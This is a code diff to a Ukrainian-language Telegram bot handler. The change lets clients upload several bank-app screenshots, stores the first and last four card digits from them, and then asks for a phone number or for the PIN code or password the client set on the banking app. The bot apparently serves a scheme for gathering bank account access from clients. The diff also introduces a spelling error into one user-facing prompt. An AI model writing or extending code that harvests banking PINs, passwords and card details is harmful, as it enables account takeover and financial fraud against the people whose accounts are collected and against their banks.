@@ -895,10 +895,44 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
                 card_last4 = card_match.group(2)
                 await state.update_data(card_first4=card_first4, card_last4=card_last4)
             
+            # --- Робота з кількома скріншотами ---
+            # Якщо банк змінився, скидаємо список
+            last_verified_bank = state_data.get("last_verified_bank")
+            uploaded_screenshots = state_data.get("uploaded_screenshots") or []
+            if last_verified_bank != current_bank_name:
+                uploaded_screenshots = []
+                await state.update_data(uploaded_screenshots=[], last_verified_bank=current_bank_name)
+
+            # Отримуємо ліміт скріншотів для поточного банку
+            key, template = await db.get_bank_template_with_key_db(current_bank_name)
+            required_count = 1
+            if template and template.get('required_screenshots'):
+                try:
+                    required_count = int(template['required_screenshots'])
+                except Exception:
+                    pass
+
+            if photo.file_id not in [s['file_id'] for s in uploaded_screenshots]:
+                uploaded_screenshots.append({
+                    'file_id': photo.file_id,
+                    'card_first4': card_first4,
+                    'card_last4': card_last4
+                })
+                await state.update_data(uploaded_screenshots=uploaded_screenshots)
+
+            if len(uploaded_screenshots) < required_count:
+                remaining = required_count - len(uploaded_screenshots)
+                # Повідомляємо клієнта про необхідність надіслати наступний скріншот
+                await message.answer(f"Дякую! Скріншот прийнято. Будь ласка, надішліть наступний скріншот (залишилось завантажити: {remaining}).")
+                return
+
+            # Об'єднуємо всі file_id через кому, щоб зберегти історію в БД
+            success_photos_str = ",".join([s['file_id'] for s in uploaded_screenshots])
+            
             await state.update_data(success_photo_id=photo.file_id)
             await db.update_session_verification_data(
                 client_id, 
-                success_photo_id=photo.file_id, 
+                success_photo_id=success_photos_str, 
                 card_first4=card_first4, 
                 card_last4=card_last4
             )
@@ -909,15 +943,15 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
                     await continue_after_phone(message, state, bot, client_id)
                 else:
                     success_text = (
-                        "Дякую! Скріншот прийнято.\n\n"
+                        "Дякую! Усі скріншоти прийнято.\n\n"
                         "Будь ласка, напишіть Ваш номер телефону?"
                     )
                     await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
                     await state.set_state(RegistrationStates.waiting_phone)
             else:
                 success_text = (
-                    "Дякую! Скріншот прийнято.\n\n"
-                    "Який пін-код чи пароль ставили на додаток?"
+                    "Дякую! Усі скріншоти прийнято.\n\n"
+                    "Який пін-код чи пароль ставали на додаток?"
                 )
                 await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
                 await state.set_state(RegistrationStates.waiting_password)
